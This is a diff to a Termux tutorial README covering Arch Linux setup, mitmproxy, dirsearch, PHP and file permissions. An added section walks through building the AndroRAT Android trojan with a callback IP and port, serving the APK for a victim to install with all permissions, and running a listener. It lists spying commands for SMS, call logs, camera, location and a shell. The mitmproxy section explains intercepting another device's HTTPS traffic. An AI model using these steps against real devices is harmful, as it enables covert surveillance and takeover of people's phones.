@@ -121,36 +121,604 @@ Now you’re inside Ubuntu. You can install tools with apt, set up xfce, mitmpro
 
 ## 🧰 Toolkits & Use Cases
 
-🔎 Dirsearch (Web Directory Brute Force)
+**💥[1]Use Arch Linux Through Termux**
+
+🏁Initial Setup (after install)
+
+**For using sudo, first install it**
 ```
-git clone https://github.com/maurosoria/dirsearch.git
-cd dirsearch
-pip install -r requirements.txt
-python3 dirsearch.py -u https://example.com -e php,html
+pacman -S sudo
+```
+
+**Set timezone**
+```
+ln -sf /usr/share/zoneinfo/Region/City /etc/localtime
+hwclock --systohc
+```
+
+**Generate locales**
+```
+echo "en_US.UTF-8 UTF-8" > /etc/locale.gen
+locale-gen
+echo "LANG=en_US.UTF-8" > /etc/locale.conf
+```
+
+**Set hostname**
+```
+echo myhostname > /etc/hostname
 ```
 
 ---
 
-🔍 mitmproxy (HTTP/HTTPS Sniffer)
+🧑‍💻 User Management
+
+**Add user and set password**
+```
+useradd -m -G wheel myuser
+passwd myuser
+```
+
+**Allow wheel group sudo access**
+```
+EDITOR=nano visudo
+```
+
+**Then uncomment:**
+```
+#%wheel ALL=(ALL:ALL) ALL
+```
+
+---
+
+📦 Pacman (Package Manager)
+
+**Update system (update & upgrade)**
+```
+sudo pacman -Syu
+```
+
+**Install package**
+```
+sudo pacman -S packagename
+```
+
+**Remove package**
+```
+sudo pacman -R packagename
+```
+
+**Remove package with dependencies**
+```
+sudo pacman -Rns packagename
+```
+
+**Search for package**
+```
+pacman -Ss keyword
+```
+
+**List installed packages**
+```
+pacman -Q
+```
+
+---
+
+🛠️ System Maintenance
+
+**Clean cache (except current packages)**
+```
+sudo pacman -Sc
+```
+
+**Clean all cache (aggressive)**
+```
+sudo pacman -Scc
+```
+
+**List orphan packages**
+```
+pacman -Qdt
+```
+
+**Remove orphan packages**
+```
+sudo pacman -Rns $(pacman -Qdtq)
+```
+
+---
+
+🔧 AUR (Arch User Repository)
+
+Pacman doesn’t support AUR directly. Use an AUR helper like yay:
+
+**Install yay (requires git and base-devel)**
+```
+git clone https://aur.archlinux.org/yay.git
+cd yay
+makepkg -si
+```
+
+**Use yay**
+
+yay -S package-name
+yay -Rns package-name
+yay -Yc  # Clean orphan packages
+
+
+---
+
+🌐 Networking
+
+**Check IP**
+```
+ip a
+```
+
+**Enable & start NetworkManager (Wi-Fi/Ethernet)**
+
+sudo systemctl enable NetworkManager
+sudo systemctl start NetworkManager
+
+**Use terminal UI**
+```
+nmtui
+```
+
+---
+
+🖥️ GUI and Display
+
+**Install Xorg**
+```
+sudo pacman -S xorg xorg-xinit
+```
+
+**Install desktop environment (example: XFCE)**
+```
+sudo pacman -S xfce4 xfce4-goodies
+```
+
+**Enable display manager (example: LightDM)**
+
+sudo pacman -S lightdm lightdm-gtk-greeter
+sudo systemctl enable lightdm
+
+
+---
+
+📁 Filesystem and Disks
+
+**Mount disk**
+```
+mount /dev/sdX1 /mnt
+```
+**Format to ext4**
+```
+mkfs.ext4 /dev/sdX1
+```
+**List disks**
+```
+lsblk
+```
+
+---
+
+**💥[2]mitmproxy on Android (No Root)**
+
+**📦 Manual Download (if needed)**
+
+Manually download mitmproxy from the browser, move to Termux file system, and extract:
+
+🔗 [https://mitmproxy.org/downloads/](https://mitmproxy.org/downloads/)
+
+**Rename it:**
+
+mv <downloaded_file> mitmproxy.tar.gz
+
+**Extract it:**
+```
+tar -xvzf mitmproxy.tar.gz
+```
+
+---
+
+✅ FULL GUIDE: Install & Configure mitmproxy on Android (No Root)
+
+📌 REQUIREMENTS
+
+Tool	Description
+
+Termux	Terminal emulator for Android
+
+Python	Needed for mitmproxy
+
+mitmproxy	Main tool for HTTPS interception
+
+Target device(which can be android phone, computer, laptop etc with connection of internet) with proxy + cert
+
+one main HOST device (android,pc etc) all process done in this device 
+
+
+
+---
+
+🧰 PART 1: Setup mitmproxy on Android
+
+🔹 Step 1: Install Termux
+
+1. Download Termux from F-Droid (don’t use Play Store version)
+   
+👉 https://f-droid.org/packages/com.termux/
+
+
+2. Open Termux and run:
+```
+pkg update && pkg upgrade -y
+pkg install python openssl curl -y
+
+```
+
+---
+
+🔹 Step 2: Install mitmproxy
 ```
 pip install mitmproxy
-mitmproxy --listen-port 8080
 ```
 
-Use to inspect mobile traffic. For advanced use, install cert on second device, set proxy, and run HTTP server.
+Check version:
+```
+mitmproxy --version
+```
+
+---
+
+🔹 Step 3: Start mitmproxy
+```
+mitmproxy --mode regular --listen-port 8080
+```
+
+To run in background:
+```
+nohup mitmproxy --mode regular --listen-port 8080 &
+```
+
+---
+
+📱 PART 2: Configure Target Device
+
+🔹 Step 4: Install mitmproxy Certificate
+
+1. On target device's browser, visit:
+
+http://<HOST_IP>:8080
+
+# Example: 
+http://192.168.1.102:8080
+
+2. Download the certificate from:
+
+mitmproxy-ca-cert.pem
+
+
+3. Rename it:
+
+mitmproxy-ca-cert.crt
+
+4. Install it:
+
+Go to: Settings > Security > Install from storage
+
+Select the .crt file
+
+Name it: mitmproxy
+
+Certificate type: VPN and apps
+
+
+✅ Confirm:
+
+> Settings > Security > Trusted Credentials > User should show mitmproxy
+
+---
+
+🔹 Step 5: Set Proxy in Wi-Fi
+
+1. On target device, go to:
+
+Settings > Wi-Fi > [Your Network] > Advanced
+
+
+2. Set:
+
+Proxy: Manual
+
+Hostname: IP address of OnePlus
+
+Port: 8080
+
+
+✅ Now all target device's traffic is routed through mitmproxy on HOST device 
+
+---
+
+👁️ PART 3: Monitor & Use mitmproxy
+
+🔹 View Logs Live
+```
+mitmproxy --mode regular --listen-port 8080
+```
+
+Controls:
+
+Navigate with arrow keys
+
+Press ? for help
+
+Press a to view full HTTP/HTTPS data
+
+Press q to quit
+
+---
+
+🔹 Export HTTP Logs (Optional)
+
+Save logs:
+```
+mitmproxy -w captured.log
+```
+
+Read logs later:
+```
+mitmproxy -r captured.log
+```
+
+---
+
+🚫 PART 4: To Stop Monitoring
+
+On target device:
+
+Reset Wi-Fi proxy settings to None
+
+
+On HOST device:
+```
+killall mitmproxy
+```
+
+---
+
+🔐 Optional: Bypass Certificate Pinning
+
+Apps like:
+
+YouTube
+
+Instagram
+
+Banking apps
+
+
+…may not work unless patched.
+
+Tools required:
+
+Frida + Objection (root or virtual space needed)
+
+Custom patching (advanced)
+
+---
+
+✅ Final Summary
+
+Step	Action
+
+✅	Install Termux + Python
+
+✅	pip install mitmproxy
+
+✅	Run mitmproxy on port 8080
+
+✅	Install cert on Samsung
+
+✅	Set Samsung’s proxy to OnePlus
+
+✅	View all HTTP/HTTPS traffic in Termux
+
+---
+
+**💥[3]Use dirsearch in Ubuntu (Proot) in the termux**
+
+### 1. 🧰 Install Python Tools
+
+```bash
+sudo apt update
+sudo apt install -y python3-pip python3-setuptools python3-venv build-essential
+```
+
+---
+
+2. 🧪 Create a Clean Virtual Environment
+```
+cd ~
+python3 -m venv envdir
+source envdir/bin/activate
+```
+
+✅ You should now see ((envdir)) in your prompt.
 
 
 ---
 
-🐍 AndroRAT (Educational RAT)
+3. 🔄 Clone dirsearch Repository
 ```
-git clone https://github.com/karma9874/AndroRAT.git
-cd AndroRAT
-python3 -m venv env
-source env/bin/activate
+rm -rf dirsearch
+git clone https://github.com/maurosoria/dirsearch.git
+cd dirsearch
+```
+
+---
+
+4. 📦 Install dirsearch Dependencies
+```
+pip install --upgrade pip setuptools wheel
 pip install -r requirements.txt
-python3 androRAT.py --build -i <your_ip> -p 8000 -o rat.apk
 ```
+
+✅ If this step completes without errors like pkg_resources or puccinialin, you’re ready!
+
+
+---
+
+5. 🚀 Run dirsearch
+```
+python3 dirsearch.py -u http://example.com -e php,html
+```
+
+---
+
+✅ Optional: Create Quick Launch Script
+
+Create a script called ds.sh in your home directory:
+```
+echo 'source ~/envdir/bin/activate && cd ~/dirsearch' > ~/ds.sh
+chmod +x ~/ds.sh
+```
+
+Now you can just run:
+```
+./ds.sh
+```
+
+And it will activate your environment and open the dirsearch folder automatically.
+
+🦊🦊 Happy Hunting! 🦊🦊
+
+---
+
+**💥[4]AndroRAT**
+
+# 🐍📱 AndroRAT (Remote Access Tool for Android) — GitHub Guide
+
+> Educational use only. Do **not** use this tool for unauthorized access. Always get proper consent.
+
+---
+
+## 🔗 Clone the AndroRAT Repository
+
+```bash
+git clone https://github.com/karma9874/AndroRAT.git
+```
+
+---
+
+⚙️ Install Dependencies
+```
+sudo apt install zipalign
+sudo apt install python3 python3-venv -y
+```
+
+---
+
+📁 Set Up Python Virtual Environment
+```
+cd AndroRAT
+python3 -m venv myenv
+source myenv/bin/activate
+pip install --upgrade pip
+```
+
+---
+
+🌐 Get Your Local IP Address
+```
+ifconfig
+```
+
+Look for your local IP (e.g. 192.168.0.X).
+
+📌 In the following example, replace 192.0.0.2 with your actual IP.
+
+
+---
+
+📦 Build the RAT APK
+```
+python3 androRAT.py --build -i 192.0.0.2 -p 8000 -o rat.apk
+```
+
+---
+
+🌍 Host the APK via HTTP Server
+```
+mv rat.apk ~/Documents/
+cd ~/Documents
+python3 -m http.server 8080
+```
+
+On the receiver side, open a browser and visit:
+```
+http://<your-local-ip>:8080
+```
+
+Download & install rat.apk and grant all permissions.
+
+
+---
+
+🎮 Start Listener on Master Device
+```
+python3 androRAT.py --shell -i 192.168.43.240 -p 8000
+```
+
+---
+
+🛠️ Available Commands
+
+Command	Description
+
+deviceInfo:	Returns basic info of the device
+
+camList:	Lists available camera IDs
+
+takepic [cameraID]	Takes a picture using the specified camera
+
+startVideo [cameraID]	Starts video recording
+
+stopVideo:	Stops recording and saves the video
+
+startAudio:	Starts audio recording
+
+stopAudio:	Stops audio recording and saves the file
+
+`getSMS [inbox	sent]`
+getCallLogs:	Returns call logs in a file
+
+shell:	Opens a shell session on the device
+
+vibrate [number_of_times]	Vibrates the device
+
+getLocation:	Returns current GPS location
+
+getIP:	Returns the IP address of the device
+
+getSimDetails:	Returns SIM details
+getClipData:	Retrieves clipboard text
+
+getMACAddress:	Returns MAC address
+
+clear:	Clears the terminal screen
+
+exit:	Exits the AndroRAT shell
+
+
+
+---
+
+> ⚠️ Disclaimer: This project is intended for educational purposes only. Do not use it on devices without explicit permission. Unauthorized access is illegal and unethical.
+
+---
 
 ⚠️ For educational use only. Never use without consent.
 
@@ -193,7 +761,7 @@ chmod +x tool_name
 
 ## 🪲 About Termux
 
-**(1)All Major Usable Scripting Languages in Termux (Android)**
+**💥[1]All Major Usable Scripting Languages in Termux (Android)**
 
 Here's a complete list of scripting languages supported in Termux, including their:
 
@@ -469,7 +1037,7 @@ Node.js: Create a Telegram bot that responds to Termux system data
 
 ---
 
-# **💥[2]💻What is PHP?**
+**💥[2]💻What is PHP?**
 
 PHP stands for "Hypertext Preprocessor". It is a:
 
@@ -491,7 +1059,198 @@ echo "Hello, World!";
 Output in browser: Hello, World!
 
 
+
 ---
+
+📱 What is PHP in Termux?
+
+In Termux, PHP can be installed and used like a local web server or scripting tool, without any browser or internet. Termux lets you use PHP to:
+
+Run local web apps
+
+Make web servers (e.g., using php -S)
+
+Build Android-based control panels
+
+Communicate with Arduino (via shell, JSON, etc.)
+
+Build APIs or dashboards that interface with Termux or local sensors
+
+
+
+---
+
+🧠 Why Use PHP in Termux?
+
+Use Case	Description
+
+🖥️ Local Web Interface	Create a local control panel in a browser (e.g., 192.168.1.5:8000)
+
+⚙️ IoT Control	Send commands to Arduino from your phone browser
+
+📂 File Manager / Dashboard	Access phone files or logs via a GUI in your browser
+
+🔗 Termux Integration	Run shell commands from PHP using shell_exec()
+
+🧪 Sensor Data Logging	Log temperature, motion, sound etc. into a database or file
+
+📡 HTTP API (local or remote)	Make your Termux a web server that receives data from Arduino/STM32
+
+🔐 Login Panels / Admin Tools	Make login-protected dashboards for any local tools or sensors
+
+
+
+---
+
+✅ Example: Make a Web Interface to Control an LED (via Arduino)
+
+1. 🛠 PHP script in Termux sends echo "LED_ON" > /dev/ttyUSB0
+
+
+2. 🌐 Android browser opens localhost:8000
+
+
+3. 🧠 PHP handles button clicks (e.g., ON/OFF)
+
+
+4. 🔁 Arduino receives it via serial, turns LED on/off
+
+
+
+---
+
+🔧 How to Install PHP in Termux:
+
+pkg update && pkg upgrade
+pkg install php
+php -v  # to check version
+
+To run a web server:
+```
+php -S localhost:8080
+```
+Then open http://localhost:8080 in Termux-X11 browser or Android browser.
+
+
+---
+
+🔍 PHP vs Python in Termux
+
+Feature	PHP	Python
+
+Web interface	Excellent	Good (Flask/Django)
+
+Command runner	Good with shell_exec()	Great with subprocess, os
+
+Mobile-friendly	Lightweight and fast	Heavier, but more flexible
+
+Learning curve	Easy for basic scripts	Easy to moderate
+
+GUI	Browser-based only	Can use Kivy, Tk (not in Termux)
+
+
+
+---
+
+
+**💥[3]mini setups**
+
+**🦊create vertual environment in termux**
+
+pkg update && pkg upgrade -y
+pkg install python -y
+
+
+pkg install python-venv -y
+or
+pip install virtualenv  
+
+virtualenv venvname  (or👉)  python -m venv venvname
+
+source venvname/bin/activate
+
+deactivate
+
+
+**🦊share folder through http link**
+
+same network connection is required (use same wi-fi network)
+
+first go to folder which can you want to share in termux and run :
+```
+python -m http.server 50500
+```
+
+where 50500 is port number usable range is 49152-65535 
+
+in second device browse in browser:
+
+"your local ip:port number"
+
+
+your local ip can be like 192.168.0.27
+
+Here is your content properly formatted in Markdown for direct pasting into a README.md file on GitHub:
+
+### 🔐 View and Change Hidden Permissions in Linux
+
+🧾 To See Hidden Permissions
+
+```bash
+ls -la
+```
+
+---
+
+✏️ To Change Permissions (Example)
+
+drwx------
+-rwx------
+
+d → indicates a directory
+
+- → indicates a file
+
+
+Permission Values:
+
+Symbol	Meaning	Value
+
+r	Read	4
+w	Write	2
+x	Execute	1
+
+
+👉 Total = Sum of permissions
+For example:
+If you want to give only write and execute permission to the user, use:
+
+chmod 300 file_name
+
+
+---
+
+📌 Permission Structure Explained
+
+
+-rwx------  # Example breakdown
+
+First part (rwx) → User permissions
+
+Middle part (---) → Group permissions
+
+Last part (---) → Other (world) permissions
+
+
+
+Each can be a combination of r, w, and x.
+
+✅ Use this to fine-tune file and directory access for better control and security.
+
+---
+
+
+
 
 
 ## 🧠 Contribute
